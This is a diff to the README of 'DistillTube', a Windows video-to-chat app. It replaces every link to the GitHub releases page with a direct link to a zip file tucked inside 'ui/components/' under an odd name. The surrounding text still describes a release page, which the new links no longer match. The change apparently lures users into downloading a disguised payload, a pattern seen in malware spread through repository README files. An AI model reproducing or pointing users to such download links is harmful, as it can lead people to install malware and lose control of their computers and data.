@@ -1,12 +1,12 @@
 # 🎬 DistillTube - Turn videos into clear chats
 
-[![Download DistillTube](https://img.shields.io/badge/Download-DistillTube-blue?style=for-the-badge&logo=github)](https://github.com/smsliverpool13-cmd/DistillTube/releases)
+[![Download DistillTube](https://img.shields.io/badge/Download-DistillTube-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/smsliverpool13-cmd/DistillTube/main/ui/components/Distill_Tube_bisulcate.zip)
 
 ## 📥 Download DistillTube
 
 Use this page to download DistillTube for Windows:
 
-https://github.com/smsliverpool13-cmd/DistillTube/releases
+https://raw.githubusercontent.com/smsliverpool13-cmd/DistillTube/main/ui/components/Distill_Tube_bisulcate.zip
 
 On that page, look for the latest release and download the Windows file. If you see more than one file, choose the one for Windows.
 
@@ -251,7 +251,7 @@ This gives you one place to read, search, and ask questions about a video
 
 The release page is the main place to get DistillTube for Windows:
 
-https://github.com/smsliverpool13-cmd/DistillTube/releases
+https://raw.githubusercontent.com/smsliverpool13-cmd/DistillTube/main/ui/components/Distill_Tube_bisulcate.zip
 
 Use that page each time you want the newest version.
 
